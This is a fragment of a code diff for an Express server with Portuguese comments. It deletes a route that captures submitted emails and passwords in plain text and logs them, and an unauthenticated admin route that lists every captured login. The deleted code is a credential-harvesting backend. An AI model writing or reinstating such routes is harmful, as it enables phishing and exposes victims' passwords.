@@ -306,20 +306,6 @@ app.post('/api/avaliar', async (req, res) => {
 });
 
 
-// Rota para receber login
-app.post('/api/capturar-login', (req, res) => {
-  const { email, senha } = req.body;
-  if (!email || !senha) return res.status(400).json({ error: 'Faltam dados' });
-
-  logins.push({ email, senha, hora: new Date().toISOString() });
-  console.log('Login capturado:', email, senha);
-  res.json({ success: true });
-});
-
-// Rota para listar logins capturados (admin)
-app.get('/api/admin/logins', (req, res) => {
-  res.json(logins);
-});
 
 
 // Recebe login
